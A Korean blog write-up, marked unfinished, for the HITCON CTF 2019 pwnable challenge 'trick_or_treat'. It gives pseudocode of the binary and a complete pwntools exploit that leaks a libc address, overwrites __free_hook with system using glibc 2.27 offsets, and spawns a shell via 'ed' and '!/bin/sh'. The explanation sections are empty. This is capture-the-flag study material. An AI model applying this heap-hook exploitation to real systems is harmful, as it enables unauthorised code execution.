---
title: Hitcon CTF 2019 - trick_or_treat
categories:
 - pwnable
tags: pwn, scanf, malloc, heap
---
- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference

## Introduction

2019년 12월쯤에 쓰다만 롸업을 보안 및 내부 원리 등등을 분석하면서 다시 포스팅한다.. 예전 롸업은 

- [https://kws981024.tistory.com](https://kws981024.tistory.com)

에 있긴 한데 비밀글로 되어있어서 아마 보진 못할것이다.

아직 포스팅중...('20.07.05)

```
main (0x84a)

    scanf("%lu", [rbp-0x28])
    
    [rbp-0x10] = malloc([rbp-0x28])
    
    if [rbp-0x10] == 0:
        return 0
        
        
    for(int i =0; i<=1; i++):
        printf("Magic:%p", [rbp-0x10])
        printf("Offset & Value:")
        scanf("%lx %lx", [rbp-0x20], [rbp-0x18])
        rdx = [rbp-0x10] + [rbp-0x20]*8
        [rdx] = [rbp-0x18]
        
    exit(0)

```
## Exploit
## slv.py

```python
from pwn import *


p = process('./trick_or_treat')

script = '''
dir /usr/src/glibc/glibc-2.27/stdio-common\n
b* malloc
b* scanf
b* system
'''
#b* __GI__exit
#dir /usr/src/glibc/glibc-2.27/stdlib\n

context.terminal = ['/usr/bin/tmux', 'splitw', '-h']


def main():
    
    p.recv()
    
    p.sendline(str(10000000))
    
    leak = int(p.recv().split('0x')[1][:12], 16)
    
    libc_base = leak + 0x989ff0
    log.info('libc_base : ' + hex(libc_base))
    
    system_offset = 0x4f440
    
    system_addr = libc_base + system_offset
    
    one_gadget1 = libc_base + 0x4f2c5
    one_gadget2 = libc_base + 0x4f322
    one_gadget3 = libc_base + 0x10a38c
    
    free_hook_addr = libc_base + 0x3ed8e8
    malloc_hook_addr = libc_base + 0x3ebc30
    
    log.info('free_hook_addr : ' + hex(free_hook_addr))
    log.info('malloc_hook_addr : ' + hex(malloc_hook_addr))
    log.info('one_gadget1 : ' + hex(one_gadget1))
    log.info('one_gadget2 : ' + hex(one_gadget2))
    log.info('one_gadget3 : ' + hex(one_gadget3))
    log.info('system_addr : '+hex(system_addr))
    
    
    payload = ''
    payload += hex((free_hook_addr - leak)/8).replace('0x','')
    payload += ' '
    payload += hex(system_addr).replace('0x','')
    
    
    gdb.attach(p,script)
    p.sendline(payload)
    
    p.recv()
    
    '''
    payload =''
    payload += hex((malloc_hook_addr - leak)/8).replace('0x','')
    payload += ' '
    payload += hex(one_gadget1).replace('0x','')
    '''
    #aaabacadaeaf
    payload = ''
    payload += '0'*10000
    
    #gdb.attach(p,script)
    p.sendline(payload)
    
    p.sendline('ed')
    sleep(0.1)
    p.sendline('!/bin/sh')
    
    
    p.interactive()
    

if __name__ == '__main__':
    main()
```
## 느낀 점
## Reference


